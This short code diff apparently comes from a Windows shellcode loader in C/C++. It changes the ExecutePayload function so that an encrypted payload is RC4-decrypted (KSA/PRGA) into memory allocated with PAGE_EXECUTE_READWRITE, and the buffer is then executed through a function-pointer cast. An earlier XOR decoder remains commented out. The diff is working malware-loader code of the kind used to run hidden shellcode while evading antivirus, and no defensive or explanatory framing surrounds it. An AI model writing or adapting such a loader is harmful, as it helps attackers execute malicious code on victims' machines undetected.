@@ -24,13 +24,11 @@ void ExecutePayload(){
 		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
 	}	
 */
-	unsigned char s[256] = {0}; // Creates S box for key scheduling aglhorithm
-	rc4_init(s,Payload_key,Payload_key_len); // Apply key scheduling aglhorithm
-	rc4_decrypt(s,Payload,Payload_len);  // Decrypt payload...
 
-
-	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	memcpy(BUFFER, Payload, sizeof(Payload));
+	unsigned char S[N];
+    KSA(Payload_key,Payload_key_len,S);	
+	unsigned char* BUFFER = (unsigned char*)VirtualAlloc(NULL, Payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	PRGA(S,Payload,Payload_len,BUFFER);
 	(*(void(*)())BUFFER)();
 	
 	while(true){
